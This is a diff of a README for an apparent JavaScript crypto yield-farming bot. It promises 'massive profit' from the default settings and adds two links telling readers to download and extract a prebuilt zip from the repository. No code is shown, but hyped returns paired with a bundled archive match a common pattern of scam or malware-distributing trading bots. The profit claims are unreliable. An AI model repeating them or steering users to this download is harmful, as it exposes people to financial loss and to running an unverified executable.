@@ -5,6 +5,10 @@ The default configuration turns a massive profit in this volatile market. This b
 
 Here's a straightforward YouTube video on how to configure it and run it properly.
 
+You can download the zip file of the bot here
+
+https://github.com/Theawesomecodermike/JavaScript-yield-farming-bot-v2-stoploss/raw/main/Yield-farming-bot-V2-with-stoploss.zip
+
 Here is the 28-day test results I did by running the default settings with a Max spend set to 0.5.
   
 <img src="https://github.com/Theawesomecodermike/JavaScript-yield-farming-bot-v2-stoploss/raw/main/28days.png" >
@@ -23,7 +27,9 @@ Let’s get started.
 
 Part 1. Main software installations.
 
-Extract the Yield-farming-bot-V2-with-stoploss.zip anywhere you like that easy for you to find.
+https://github.com/Theawesomecodermike/JavaScript-yield-farming-bot-v2-stoploss/raw/main/Yield-farming-bot-V2-with-stoploss.zip
+
+download and Extract the Yield-farming-bot-V2-with-stoploss.zip anywhere you like that easy for you to find.
 
 Part 2. Editing the settings.
 
